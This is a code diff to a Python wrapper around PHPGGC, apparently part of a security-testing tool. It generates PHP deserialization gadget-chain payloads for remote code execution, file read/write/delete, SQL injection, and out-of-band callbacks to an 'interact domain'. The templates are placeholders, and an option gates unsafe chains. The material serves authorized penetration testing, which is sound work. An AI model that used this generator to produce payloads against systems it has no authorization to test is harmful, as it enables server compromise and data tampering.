@@ -9,6 +9,22 @@ class PHPGGC(Serializer):
 
     usage = 'PHPGGC: PHP Generic Gadget Chains'
 
+    payloadFormats = {
+        'RCE: Command' : ["'<system_command>'"],
+        'RCE: Function Call': ["'<php_function>' '<system_command>'"],
+        'RCE: PHP Code': ["'<code>'"],
+        'File write': ["'<remote_file_to_write>' '<local_file>'"],
+        'phpinfo()': [""],
+        'File delete': ["'<remote_file_to_delete>'"],
+        'File read': ["'<url>'", "'<remote_file_to_read>'"],
+        'SQL injection': ["'<sql>'"],
+        'RCE: eval(php://input)': [""],
+    }
+
+    unsafePayloads = [
+        'File delete'
+    ]
+
     def __init__(self, bin, chainOpts):
         self.phpggcOpts = chainOpts.phpggc_options
         super().__init__(bin, chainOpts)
@@ -26,36 +42,47 @@ class PHPGGC(Serializer):
             if chain['name'] == 'NAME': 
                 continue
 
+            if not chain['type'] in self.payloadFormats:
+                logging.debug(f'Unsupported chain type {chain["type"]}')
+                continue
+
             chains.append({
-                'id': chain['name'].lower().replace('/', '-'),
+                'id': chain['name'].replace('/', ''),
                 'name': chain['name'],
-                'description': f"{chain['name']} {chain['type']}",
+                'description': f"{chain['name']}: {chain['type']}",
                 'type': chain['type'],
+                'formats': self.payloadFormats[chain['type']],
+                'unsafe': chain['type'] in self.unsafePayloads,
             })
         return chains
     
     def payload(self, chainName, chainArgs):
         return self.exec(f"{self.phpggcOpts} {chainName} {chainArgs}", rawResult=True)
     
-    def generate(self, chains, output):
+    def generate(self, chains):
 
         if len(chains) == 0:
             return 0
 
         system_command = self.chainOpts.system_command
         interact_domain = self.chainOpts.interact_domain
-        php_functions = self.chainOpts.php_functions
+        php_function = self.chainOpts.php_function
         php_code = self.getFileContentOrCode(self.chainOpts.php_code)
-        remote_file = self.chainOpts.remote_file
+        remote_file_to_read = self.chainOpts.remote_file_to_read
+        remote_file_to_write = self.chainOpts.remote_file_to_write
+        remote_file_to_delete = self.chainOpts.remote_file_to_delete
         remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else php_code
+        sql = self.chainOpts.sql
 
-        logging.info(f"System command: {system_command}")
-        logging.info(f"PHP Functions: {php_functions}")
-        logging.info(f"PHP Code: {self.chainOpts.php_code}")
-        logging.info(f"File written on server: {remote_file}")
-        logging.info(f"Content written on server: {remote_content}")
         logging.info(f"Interact domain: {interact_domain}")
-
+        logging.info(f"System command: {system_command}")
+        logging.info(f"PHP Functions: {php_function}")
+        logging.info(f"PHP Code: {self.chainOpts.php_code}")
+        logging.info(f"File read on server: {remote_file_to_read}")
+        logging.info(f"File written on server: {remote_file_to_write}")
+        logging.info(f"Content written on server: {remote_content}")
+        logging.info(f"Remote file to delete (if unsafe): {remote_file_to_delete}")
+        
         # create an empty file that will contain PHP file with the payload
         fp = self.createTemporaryFile(suffix='.php')
         if fp == None:
@@ -63,14 +90,20 @@ class PHPGGC(Serializer):
         
         logging.info(f"Starting payload generation")
         count = 0
-        for php_function in php_functions.split(','):
+        for chain in chains:
 
-            logging.info(f"Generating payloads for {php_function}...")
+            if chain['unsafe'] and not self.chainOpts.unsafe:
+                logging.debug(f"[{chain['name']}] Skipping unsafe chain of '{chain['type']}'")
+                continue
 
             # generate payload for each chain
-            for chain in chains:
+            for format in chain['formats']:
 
                 logging.info(f"[{chain['name']}] Generating payload of type '{chain['type']}'")
+
+                if ('<url>' in format or '<domain>' in format) and not interact_domain:
+                    logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
+                    continue
 
                 chain_system_command = system_command
                 chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
@@ -78,26 +111,25 @@ class PHPGGC(Serializer):
                 chain_system_command = chain_system_command.replace("'", "\\'")
                 escaped_chain_system_command = chain_system_command.replace('"', '\\"')
 
-                # chain argument
-                if chain['type'] == "RCE: Command":
-                    chainArguments = f"'{chain_system_command}'"
-                elif chain['type'] == "RCE: Function Call":
-                    chainArguments = f"'{php_function}' '{chain_system_command}'"
-                elif chain['type'] == "RCE: PHP Code":
-                    code = f'{php_function}("{escaped_chain_system_command}");'
-                    chainArguments = f"'{code}'"
-                elif chain['type'] == "File write":
-                    with open(fp.name, mode='w') as ft:
-                        content = remote_content
-                        content = content.replace('%%system_command%%', chain_system_command)
-                        content = content.replace('%%php_function%%', php_function)
-                        content = content.replace('%%domain%%', interact_domain)
-                        content = content.replace('%%chain_id%%', chain['id'])
-                        ft.write(content)
-                    chainArguments = f"'{remote_file.replace('%%ext%%', 'php')}' '{fp.name}'"
-                else:
-                    logging.debug(f"[{chain['name']}] Skipping unhandled chain type")
-                    continue
+                content = remote_content
+                content = content.replace('%%system_command%%', chain_system_command)
+                content = content.replace('%%php_function%%', php_function)
+                content = content.replace('%%domain%%', str(interact_domain))
+                content = content.replace('%%chain_id%%', chain['id'])
+
+                chainArguments = format
+                chainArguments = chainArguments.replace('<system_command>', chain_system_command)
+                chainArguments = chainArguments.replace('<php_function>', php_function)
+                chainArguments = chainArguments.replace('<code>', f'{php_function}("{escaped_chain_system_command}");')
+                chainArguments = chainArguments.replace('<local_file>', fp.name)
+                chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
+                chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'php'))
+                chainArguments = chainArguments.replace('<remote_file_to_delete>', remote_file_to_delete)
+                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.php")
+                chainArguments = chainArguments.replace('<sql>', sql.replace("'", "\\'"))
+
+                with open(fp.name, mode='w') as ft:
+                    ft.write(content)
                 
                 result = self.payload(chain['name'], chainArguments)
                 if result.returncode != 0:
@@ -118,7 +150,11 @@ class PHPGGC(Serializer):
                 if self.chainOpts.url:
                     payload = urllib.parse.quote_plus(payload).encode('ascii')
 
-                output.write(payload+b"\n")
+                if len(chain['formats']) > 1:
+                    chainUniqueId = f"{chain['id']}_{chain['formats'].index(format)}"
+                else:
+                    chainUniqueId = chain['id']
+                self.output(chainUniqueId, payload+b"\n")
                 count = count + 1    
             
         # cleanup temp file
